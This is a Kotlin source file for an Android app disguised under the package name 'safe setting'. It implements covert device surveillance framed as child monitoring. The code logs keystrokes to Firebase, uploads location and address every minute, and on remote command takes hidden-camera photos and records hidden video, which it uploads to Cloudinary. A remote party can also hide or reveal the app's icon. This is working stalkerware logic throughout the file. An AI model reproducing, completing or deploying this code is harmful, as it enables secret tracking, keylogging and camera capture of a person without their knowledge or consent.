package com.safe.setting.app.services.accessibilityData

import android.content.Context
import android.content.Intent
import android.location.Geocoder
import android.location.Location
import android.os.Build
import android.util.Log
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.safe.setting.app.R
import com.safe.setting.app.data.model.ChildPhoto
import com.safe.setting.app.data.model.ChildVideo
import com.safe.setting.app.data.model.Photo
import com.safe.setting.app.data.model.Video
import com.safe.setting.app.data.preference.DataSharePreference.childSelected
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.services.hiddenvideo.HiddenVideoService
import com.safe.setting.app.services.hiddenvideo.VideoCallbacks
import com.safe.setting.app.utils.CloudinaryManager
import com.safe.setting.app.utils.ConstFun.showApp
import com.safe.setting.app.utils.Consts
import com.safe.setting.app.utils.Consts.CHILD_CAPTURE_PHOTO
import com.safe.setting.app.utils.Consts.CHILD_GPS
import com.safe.setting.app.utils.Consts.CHILD_PERMISSION
import com.safe.setting.app.utils.Consts.CHILD_SERVICE_DATA
import com.safe.setting.app.utils.Consts.CHILD_SHOW_APP
import com.safe.setting.app.utils.Consts.DATA
import com.safe.setting.app.utils.Consts.KEY_LOGGER
import com.safe.setting.app.utils.Consts.KEY_TEXT
import com.safe.setting.app.utils.Consts.LOCATION
import com.safe.setting.app.utils.Consts.PARAMS
import com.safe.setting.app.utils.Consts.PHOTO
import com.safe.setting.app.utils.Consts.TAG
import com.safe.setting.app.utils.MyCountDownTimer
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraConfig
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraRotation
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.disposables.CompositeDisposable
import io.reactivex.rxjava3.schedulers.Schedulers
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit
import javax.inject.Inject


class InteractorAccessibilityData @Inject constructor(
    private val context: Context,
    private val firebase: InterfaceFirebase
) : InterfaceAccessibility, CameraCallbacks, VideoCallbacks {

    private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
    private var disposable: CompositeDisposable = CompositeDisposable()
    private var lastLocationUpdate: Long = 0
    private val locationUpdateInterval: Long = 60000 // 60 seconds

    private var countDownTimer : MyCountDownTimer = MyCountDownTimer((1 * 60 * 1440000).toLong(), (1 * 1000).toLong()){
        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).removeValue()
        startCountDownTimer()
    }

    override fun startCountDownTimer() {
        countDownTimer.start()
    }

    override fun stopCountDownTimer() {
        countDownTimer.cancel()
    }


    override fun clearDisposable() {
        if (!disposable.isDisposed) {
            disposable.dispose()
        }
        disposable = CompositeDisposable()
    }

    override fun setDataKey(data: String) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push().child(KEY_TEXT).setValue(data)
    }

    override fun setDataLocation(location: Location) {
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastLocationUpdate >= locationUpdateInterval) {
            lastLocationUpdate = currentTime
            if (firebase.getUser() != null) {
                var address: String
                val geoCoder = Geocoder(context, Locale.getDefault())
                try {
                    val addresses = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        @Suppress("DEPRECATION")
                        geoCoder.getFromLocation(location.latitude, location.longitude, 1)
                    } else {
                        @Suppress("DEPRECATION")
                        geoCoder.getFromLocation(location.latitude, location.longitude, 1)
                    }
                    address = addresses?.firstOrNull()?.getAddressLine(0) ?: context.getString(R.string.address_not_found)
                } catch (e: IOException) {
                    address = context.getString(R.string.address_not_found)
                }
                val model = com.safe.setting.app.data.model.Location(location.latitude, location.longitude, address, getDateTime())
                firebase.getDatabaseReference("$LOCATION/$DATA").setValue(model)
            }
        }
    }

    override fun enablePermissionLocation(location: Boolean) {
        if (firebase.getUser() != null) {
            firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_PERMISSION").setValue(location)
        }
    }

    override fun enableGps(gps: Boolean) {
        if (firebase.getUser() != null) {
            firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_GPS").setValue(gps)
        }
    }

    override fun setRunServiceData(run: Boolean) {
        if (firebase.getUser() != null) {
            firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA").setValue(run)
        }
    }

    override fun getShowOrHideApp() {
        disposable.add(firebase.valueEvent("$DATA/$CHILD_SHOW_APP")
            .map { data -> data.value as Boolean }
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ context.showApp(it) },
                { e -> Log.e(TAG, "getShowOrHideApp failed: ${e.message}") }))
    }

    override fun getCapturePicture() {
        disposable.add(firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ child -> startCameraPicture(child) },
                { error -> Log.e(TAG, "getCapturePicture failed: ${error.message}") }))
    }

    private fun startCameraPicture(childPhoto: ChildPhoto) {
        if (childPhoto.capturePhoto == true) {
            val cameraConfig = CameraConfig().builder(context)
                .setCameraFacing(childPhoto.facingPhoto!!)
                .setImageRotation(
                    if (childPhoto.facingPhoto == CameraFacing.FRONT_FACING_CAMERA) CameraRotation.ROTATION_270
                    else CameraRotation.ROTATION_90
                )
                .build()
            pictureCapture.startCamera(cameraConfig)
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onImageCapture(imageFile: File) {
        pictureCapture.stopCamera()
        disposable.add(CloudinaryManager.uploadPhoto(imageFile)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ url ->
                val photo = Photo(imageFile.name, getDateTime(), url)
                firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
                firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
                firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
                imageFile.delete()
            }, {
                Log.e(TAG, "Image upload failed: ${it.message}")
                imageFile.delete()
            })
        )
    }

    override fun onCameraError(errorCode: Int) {
        pictureCapture.stopCamera()
        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
        if (errorCode == CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE ||
            errorCode == CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ||
            errorCode == CameraError.ERROR_IMAGE_WRITE_FAILED) {
            firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(false)
        }
    }

    // ================== नया वीडियो लॉजिक ==================
    override fun getCaptureVideo() {
        disposable.add(firebase.valueEventModel("${Consts.VIDEO}/${Consts.PARAMS}", ChildVideo::class.java)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe(
                { childVideo -> handleVideoCommand(childVideo) },
                { error -> Log.e(TAG, "getCaptureVideo failed: ${error.message}") }
            ))
    }

    private fun handleVideoCommand(childVideo: ChildVideo) {
        if (childVideo.captureVideo == true) {
            val now = System.currentTimeMillis()
            val lastRequestTime = childVideo.videoRequestTimestamp ?: 0
            val count = childVideo.videoRequestCount ?: 0

            // 24 घंटे की अवधि की जांच करें
            if (now - lastRequestTime > TimeUnit.HOURS.toMillis(24)) {
                // 24 घंटे से अधिक समय बीत चुका है, काउंटर रीसेट करें
                startVideoRecording(childVideo, 1, now)
            } else if (count < 5) {
                // 24 घंटे के भीतर, लेकिन सीमा से कम
                startVideoRecording(childVideo, count + 1, now)
            } else {
                // सीमा पूरी हो चुकी है
                Log.w(TAG, "Daily video recording limit reached.")
                Toast.makeText(context, "Daily video recording limit reached.", Toast.LENGTH_SHORT).show()
                resetVideoCommand()
            }
        }
    }

    private fun startVideoRecording(childVideo: ChildVideo, newCount: Int, newTimestamp: Long) {
        // Firebase में काउंटर और टाइमस्टैम्प अपडेट करें
        val paramsRef = firebase.getDatabaseReference("${Consts.VIDEO}/${Consts.PARAMS}")
        val updates = mapOf(
            "videoRequestCount" to newCount,
            "videoRequestTimestamp" to newTimestamp
        )
        paramsRef.updateChildren(updates)

        // वीडियो रिकॉर्डिंग सेवा शुरू करें
        val cameraConfig = CameraConfig().builder(context)
            .setCameraFacing(childVideo.facingVideo ?: CameraFacing.FRONT_FACING_CAMERA)
            .build()

        val intent = Intent(context, HiddenVideoService::class.java)
        HiddenVideoService.cameraConfig = cameraConfig
        HiddenVideoService.videoCallbacks = this
        context.startService(intent)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onVideoRecorded(videoFile: File) {
        disposable.add(CloudinaryManager.uploadVideo(videoFile)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ url ->
                val video = Video(videoFile.name, getDateTime(), url)
                firebase.getDatabaseReference("${Consts.VIDEO}/$DATA").push().setValue(video)
                resetVideoCommand()
                videoFile.delete()
            }, {
                Log.e(TAG, "Video upload failed: ${it.message}")
                resetVideoCommand()
                videoFile.delete()
            })
        )
    }

    fun onVideoError(errorCode: Int) {
        Log.e(TAG, "Video recording error: $errorCode")
        resetVideoCommand()
    }

    private fun resetVideoCommand() {
        firebase.getDatabaseReference("${Consts.VIDEO}/${Consts.PARAMS}/captureVideo").setValue(false)
    }

    // ================== वीडियो लॉजिक का अंत ==================

    private fun getDateTime(): String {
        return SimpleDateFormat("yyyy-MM-dd hh:mm:aa", Locale.getDefault()).format(Date())
    }
}

